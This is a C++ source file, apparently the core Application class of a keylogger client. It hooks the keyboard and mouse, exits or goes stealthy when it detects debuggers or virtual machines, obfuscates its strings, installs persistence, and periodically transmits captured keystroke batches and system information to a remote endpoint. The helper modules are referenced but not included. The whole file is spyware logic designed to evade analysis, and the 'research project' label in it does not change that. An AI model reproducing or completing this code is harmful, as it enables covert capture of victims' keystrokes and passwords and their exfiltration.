// KeyLoggerClient/src/core/Application.cpp

#include "core/Application.h"
#include "core/Configuration.h"
#include "core/Logger.h"
#include "hooks/KeyHook.h"
#include "hooks/MouseHook.h"
#include "security/AntiAnalysis.h"
#include "security/Obfuscation.h"
#include "persistence/PersistenceManager.h"
#include "communication/CommsManager.h"
#include "data/DataManager.h"
#include "utils/SystemUtils.h"
#include "utils/FileUtils.h"
#include "utils/TimeUtils.h"
#include <thread>
#include <chrono>
#include <string>

// Obfuscated strings
constexpr auto OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerResearchProject");
constexpr auto OBFUSCATED_MUTEX_NAME = OBFUSCATE("KLRP_MUTEX_7E3F1A");

Application::Application() : m_running(false), m_config(nullptr) {
    // Constructor remains the same
}

Application::~Application() {
    Shutdown();
}

bool Application::Initialize() {
    // Anti-analysis checks
    if (security::AntiAnalysis::IsDebuggerPresent()) {
        ExitProcess(0);
    }

    if (security::AntiAnalysis::IsRunningInVM()) {
        // Continue but use different tactics
        utils::SystemUtils::EnableStealthMode();
    }

    // Singleton instance check
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, OBFUSCATED_MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        ExitProcess(0);
    }

    // Initialize components
    m_config = std::make_unique<Configuration>();
    if (!m_config->LoadConfiguration()) {
        return false;
    }

    Logger::Init(m_config->GetLogPath());
    LOG_INFO("Application initializing");

    m_dataManager = std::make_unique<DataManager>(m_config.get());
    m_commsManager = std::make_unique<CommsManager>(m_config.get());
    m_persistenceManager = std::make_unique<PersistenceManager>(m_config.get());

    // Install persistence mechanisms
    if (m_config->GetEnablePersistence()) {
        m_persistenceManager->Install();
    }

    // Initialize hooks
    m_keyHook = std::make_unique<KeyHook>(m_dataManager.get());
    m_mouseHook = std::make_unique<MouseHook>(m_dataManager.get());

    LOG_INFO("Application initialized successfully");
    return true;
}

void Application::Run() {
    m_running = true;
    LOG_INFO("Application starting main loop");

    // Initialize batch collection
    m_dataManager->StartBatchCollection();
    auto lastBatchTime = std::chrono::steady_clock::now();

    std::string lastNetworkMode = "";
    auto lastSystemCollection = std::chrono::steady_clock::now();

    while (m_running) {
        // Check for network mode changes
        std::string currentNetworkMode = m_config->GetNetworkMode();
        if (currentNetworkMode != lastNetworkMode) {
            LOG_INFO("Network mode changed, reinitializing communication");
            m_commsManager->Shutdown();
            m_commsManager->Initialize();
            lastNetworkMode = currentNetworkMode;
        }

        // Check for exit conditions
        if (utils::SystemUtils::IsExitTriggered()) {
            Shutdown();
            break;
        }

        // Check if it's time to transmit batch data (every 5 minutes)
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(now - lastBatchTime);

        if (elapsed.count() >= 5 && m_dataManager->IsBatchReady()) {
            auto batchData = m_dataManager->GetBatchData();

            if (!batchData.empty()) {
                if (m_commsManager->TransmitData(batchData)) {
                    LOG_INFO("Batch data transmitted successfully");
                    lastBatchTime = now;

                    // Start new batch
                    m_dataManager->StartBatchCollection();
                } else {
                    LOG_ERROR("Batch data transmission failed");
                    // Retry after shorter interval
                    utils::TimeUtils::JitterSleep(30000, 0.2);
                }
            }
        }

        // Periodic system information collection (every 30 minutes)
        auto elapsedSystemCollection = std::chrono::duration_cast<std::chrono::minutes>(now - lastSystemCollection);
        if (elapsedSystemCollection.count() >= 30 && m_config->GetCollectSystemInfo()) {
            auto systemInfo = utils::SystemUtils::CollectSystemInformation();
            m_dataManager->AddSystemData(systemInfo);
            lastSystemCollection = now;
            LOG_DEBUG("System information collected");
        }

        // Sleep with jitter
        utils::TimeUtils::JitterSleep(10000, 0.2); // Check every 10 seconds

        // Perform anti-analysis checks periodically
        static int antiAnalysisCounter = 0;
        if (++antiAnalysisCounter >= 360) { // ~1 hour (10s * 360)
            security::AntiAnalysis::Countermeasure();
            antiAnalysisCounter = 0;
        }
    }
}

void Application::Shutdown() {
    if (!m_running) return;

    m_running = false;
    LOG_INFO("Application shutting down");

    // Remove hooks first
    m_keyHook.reset();
    m_mouseHook.reset();

    // Clean up persistence if configured
    if (m_config->GetRemovePersistenceOnExit()) {
        m_persistenceManager->Remove();
    }

    // Transmit any remaining batch data
    if (m_dataManager->IsBatchReady()) {
        auto batchData = m_dataManager->GetBatchData();
        if (!batchData.empty()) {
            m_commsManager->TransmitData(batchData);
        }
    }

    m_commsManager.reset();
    m_dataManager.reset();
    m_persistenceManager.reset();
    m_config.reset();

    Logger::Shutdown();
}
